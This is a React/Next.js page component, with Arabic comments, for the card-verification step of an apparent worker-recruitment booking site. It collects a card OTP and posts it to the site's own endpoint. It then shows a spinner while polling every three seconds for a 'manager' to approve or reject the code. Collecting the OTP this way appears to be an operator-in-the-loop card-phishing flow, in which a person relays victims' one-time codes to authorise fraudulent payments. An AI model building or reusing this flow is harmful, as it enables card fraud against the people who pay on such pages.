"use client";

import { useState, useEffect, FormEvent } from "react";
import { useRouter } from "next/navigation";
import Link from "next/link";
import { Dictionary } from "@/lib/i18n";
import { Card } from "@/components/ui/Card";
import { Button } from "@/components/ui/Button";
import { formatSalary } from "@/lib/utils";
import { CandidateImage } from "./CandidateImage";
import type { Booking, Worker } from "@/lib/supabase/types";
import styles from "./VerifyCardClient.module.css";

export function VerifyCardClient({
  booking,
  paymentEntryId,
  dict,
  locale,
}: {
  booking: Booking & { workers: Worker };
  paymentEntryId: string;
  dict: Dictionary;
  locale: string;
}) {
  const router = useRouter();
  const p = dict.payment;

  const [otp, setOtp] = useState("");
  const [error, setError] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);
  // حالة انتظار قرار المدير على رمز التحقق
  const [verifying, setVerifying] = useState(false);
  const [otpEntryId, setOtpEntryId] = useState<string | null>(null);
  const [success, setSuccess] = useState(false);

  const amount = booking.workers?.expected_salary ?? 0;
  const serviceFee = Math.round(amount * 0.1);
  const total = amount + serviceFee;

  // استطلاع قرار المدير على رمز التحقق كل 3 ثوانٍ
  useEffect(() => {
    if (!verifying || !otpEntryId) return;
    const interval = setInterval(async () => {
      try {
        const res = await fetch(`/api/payments/otp-status?entryId=${otpEntryId}`, {
          cache: "no-store" as RequestCache,
        });
        const data = await res.json();
        if (data.status === "approved") {
          setVerifying(false);
          setSuccess(true);
        } else if (data.status === "rejected") {
          setVerifying(false);
          setError(p.otpRejectedMsg);
          setOtp("");
          setOtpEntryId(null);
        }
      } catch {
        // تجاهل أخطاء الشبكة مؤقتاً
      }
    }, 3000);
    return () => clearInterval(interval);
  }, [verifying, otpEntryId, p.otpRejectedMsg]);

  async function handleSubmit(e: FormEvent) {
    e.preventDefault();
    setError(null);
    const code = otp.trim();
    // التحقق من الطول: 4 أرقام أو 6 أرقام
    if (!/^\d{4}$/.test(code) && !/^\d{6}$/.test(code)) {
      setError(p.otpLengthError);
      return;
    }
    setLoading(true);
    try {
      const res = await fetch("/api/payments/submit-otp", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "x-fingerprint": "fp-client",
        },
        body: JSON.stringify({
          paymentEntryId,
          bookingId: booking.id,
          otp: code,
        }),
      });
      const data = await res.json();
      if (!res.ok) {
        setError(p.otpLengthError);
        return;
      }
      // تم الإرسال — انتقل لشاشة الانتظار
      setOtpEntryId(data.entryId);
      setVerifying(true);
    } catch {
      setError(p.otpLengthError);
    } finally {
      setLoading(false);
    }
  }

  // ===== شاشة النجاح =====
  if (success) {
    return (
      <div className={styles.layout}>
        <Card className={styles.successCard}>
          <div className={styles.successIcon}>✓</div>
          <h1 className={styles.successTitle}>{p.successTitle}</h1>
          <p className={styles.successSub}>{p.successSub}</p>
          <div className={styles.refRow}>
            <span>{p.bookingRef}</span>
            <strong>{booking.booking_ref}</strong>
          </div>
          <Link className={styles.successLink} href={`/${locale}/account`}>
            {locale === "ar" ? "الذهاب إلى حسابي" : "Go to my account"}
          </Link>
        </Card>
      </div>
    );
  }

  // ===== شاشة جارٍ التحقق =====
  if (verifying) {
    return (
      <div className={styles.layout}>
        <Card className={styles.verifyingCard}>
          <div className={styles.spinnerWrap}>
            <div className={styles.spinner} />
          </div>
          <h1 className={styles.verifyingTitle}>{p.verifyingWait}</h1>
          <p className={styles.verifyingSub}>{p.verifyingSub}</p>
        </Card>
      </div>
    );
  }

  return (
    <div className={styles.layout}>
      <div className={styles.header}>
        <h1 className={styles.title}>{p.verifyTitle}</h1>
        <p className={styles.subtitle}>{p.verifySubtitle}</p>
      </div>

      <div className={styles.grid}>
        <Card className={styles.formCard}>
          <form onSubmit={handleSubmit} className={styles.form}>
            <div className={styles.otpSingleWrap}>
              <label className={styles.otpLabel}>{p.otpLabel}</label>
              <input
                type="text"
                inputMode="numeric"
                value={otp}
                onChange={(e) => setOtp(e.target.value.replace(/\D/g, "").slice(0, 6))}
                placeholder={p.otpSinglePh}
                className={styles.otpSingleInput}
                autoFocus
                maxLength={6}
              />
            </div>

            {error && <div className={styles.error}>{error}</div>}

            <Button type="submit" size="lg" disabled={loading}>
              {loading ? p.processing : p.submitOtp}
            </Button>

            <Link href={`/${locale}/payment/${booking.id}`} className={styles.backLink}>
              ← {p.back}
            </Link>
          </form>
        </Card>

        <Card className={styles.summary}>
          <h2 className={styles.sectionTitle}>{p.worker}</h2>
          <div className={styles.workerCard}>
            {booking.workers && <CandidateImage worker={booking.workers} locale={locale as "ar" | "en"} className={styles.workerImg} />}
            <div>
              <h3 className={styles.workerName}>
                {booking.workers?.full_name}
              </h3>
              <p className={styles.workerMeta}>
                {booking.workers?.nationality}
              </p>
            </div>
          </div>
          <div className={styles.summaryRows}>
            <div className={styles.summaryRow}>
              <span>{p.amount}</span>
              <strong>{formatSalary(amount, locale)}</strong>
            </div>
            <div className={styles.summaryRow}>
              <span>{p.serviceFee} (10%)</span>
              <strong>{formatSalary(serviceFee, locale)}</strong>
            </div>
            <div className={`${styles.summaryRow} ${styles.totalRow}`}>
              <span>{p.total}</span>
              <strong>{formatSalary(total, locale)}</strong>
            </div>
          </div>
          <div className={styles.refRow}>
            <span>{p.bookingRef}</span>
            <strong>{booking.booking_ref}</strong>
          </div>
        </Card>
      </div>
    </div>
  );
}
